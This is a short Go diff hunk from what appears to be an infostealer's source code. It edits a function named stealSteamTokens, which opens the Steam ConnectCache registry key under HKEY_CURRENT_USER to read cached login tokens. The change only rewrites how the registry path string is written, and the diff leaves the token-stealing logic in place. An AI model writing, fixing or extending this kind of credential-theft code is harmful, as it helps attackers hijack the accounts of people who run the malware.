@@ -394,7 +394,7 @@ func stealSteamTokens() string {
 	var sb strings.Builder
 
 	var hKey syscall.Handle
-	keyPath, _ := syscall.UTF16PtrFromString(`Software\Valve\Steam\ConnectCache`)
+	keyPath, _ := syscall.UTF16PtrFromString("Software\\Valve\\Steam\\ConnectCache")
 	err := syscall.RegOpenKeyEx(syscall.HKEY_CURRENT_USER, keyPath, 0, syscall.KEY_READ, &hKey)
 	if err == nil {
 		defer syscall.RegCloseKey(hKey)
